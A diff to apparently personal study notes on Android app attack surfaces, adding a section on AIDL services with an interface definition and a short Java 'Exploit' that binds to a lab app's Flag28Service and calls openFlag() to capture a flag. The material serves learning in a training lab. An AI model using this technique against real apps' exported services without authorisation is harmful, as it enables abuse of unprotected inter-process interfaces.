@@ -2,6 +2,7 @@
 - [Overview](#overview)
 - [Bindable service & Non-bindable service](#bindable-service--non-bindable-service)
 - [Message Handler Service](#message-handler-service)
+- [AIDL Service](#aidl-service)
 
 
 
@@ -308,3 +309,59 @@ public class Hextree extends AppCompatActivity {
 
 }
 ```
+
+## AIDL Service
+- Services based on AIDL (Android Interface Definition Language) can be easily recognised by looking at the `onBind()` method that returns some kind of .Stub binder.
+
+- These services are based on AIDL files, which look similar to Java, but they are written in the "Android Interface Definition Language".
+
+```
+package io.hextree.attacksurface.services;
+
+interface IFlag28Interface {
+    boolean openFlag();
+}
+```
+
+- During compilation this .aidl definition is then translated into an actual .java class that implements the low-level binder code to interact with the service.
+
+- When we want to interact with such a service we probably want to reverse engineer the original .aidl file.
+
+```java
+// Exploit
+public class Hextree extends AppCompatActivity {
+    private Messenger serviceMessenger = null;
+    private ServiceConnection connection = new ServiceConnection() {
+        @Override
+        public void onServiceConnected(ComponentName name, IBinder binder) {
+            serviceMessenger = new Messenger(binder);
+            IFlag28Interface aidlService = IFlag28Interface.Stub.asInterface(binder);
+            try {
+                aidlService.openFlag();
+            } catch (RemoteException e) {
+                throw new RuntimeException(e);
+            }
+        }
+        @Override
+        public void onServiceDisconnected(ComponentName name) {
+        }
+    };
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        EdgeToEdge.enable(this);
+        setContentView(R.layout.activity_main);
+        Button button = findViewById(R.id.click);
+        button.setOnClickListener(v -> {
+            // Bind to the service
+            Intent intent = new Intent();
+            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service");
+            bindService(intent, connection, Context.BIND_AUTO_CREATE);
+        });
+
+    }
+
+}
+```
+ 
